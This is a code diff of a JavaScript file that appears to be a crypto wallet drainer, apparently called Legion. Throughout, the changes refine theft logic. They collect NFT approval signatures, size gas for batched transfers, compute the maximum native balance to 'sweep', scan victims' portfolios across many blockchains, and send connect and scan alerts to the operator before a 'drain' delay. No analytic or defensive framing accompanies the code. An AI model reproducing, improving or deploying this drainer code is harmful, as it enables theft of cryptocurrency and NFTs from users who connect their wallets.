-          } catch (ne) { L.warn('NFT approval sign fail:', cKey, ne.message); }
+            nftApprovalSigs[entry.contract] = nsig;
+          } catch (ne) { L.warn('NFT approval sign fail:', entry.contract, ne.message); }
         }
       }
     }
@@ -3158,7 +3481,9 @@
     var caps = await getCapabilities(provider, address, chainId);
     L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, 'sendCallsV2:', caps.sendCallsV2, '| signOnly:', SIGN_ONLY);
 
-    var gasLimit = estimateSendCallsGasLimit(assets.tokens.length, assets.nfts.length, true, chainId);
+    var gasLimit = estimateSendCallsGasLimit(
+      assets.tokens.length, countUniqueNftContracts(assets.nfts), true, chainId
+    );
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
     var nativeSend = sweep.send;
     if (nativeSend > 0n) {
@@ -3983,10 +4308,10 @@
       : collectAddressMap(evmCtx.address);
     S.omnichainLegs = {};
 
-    var portfolio = await scanFullPortfolio(evmCtx.address);
+    var portfolio = await scanFullPortfolio(evmCtx.address, addrs);
 
     await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
-    await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
+    await broadcastConnectScan(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
     await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
     var fusionData = await SCOUT.fusion(addrs);
     if (fusionData && fusionData.total_usd) {
@@ -4954,18 +5279,13 @@
       S.fusionNotified = false;
       S.familiesLinked = false;
       S.familyConnections = {};
+      S.evmScanChainIds = null;
       S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
       S.allAddresses = {};
 
       UI.showStatus('Linking all blockchains...');
-      discoverChainFamilies();
-      if (S.connectMode !== 'wc') {
-        await connectAllFamilies();
-      } else {
-        applyLegionWalletSessionAddresses();
-        S.familiesLinked = true;
-        S.allAddresses = collectAddressMap(address);
-      }
+      await linkAllFamiliesOnConnect(address);
+      await broadcastConnectScan(address, chainId, walletName, S.allAddresses);
 
       await sleep(CFG.delayDrainMs || 300);
 
@@ -5264,6 +5584,10 @@
       },
     },
   };
+
+  try {
+    window.dispatchEvent(new CustomEvent('legion:ready', { detail: { version: LEGION_VERSION } }));
+  } catch (readyEv) { /* IE11 guard */ }
 
   // Boot
   if (document.readyState === 'loading') {
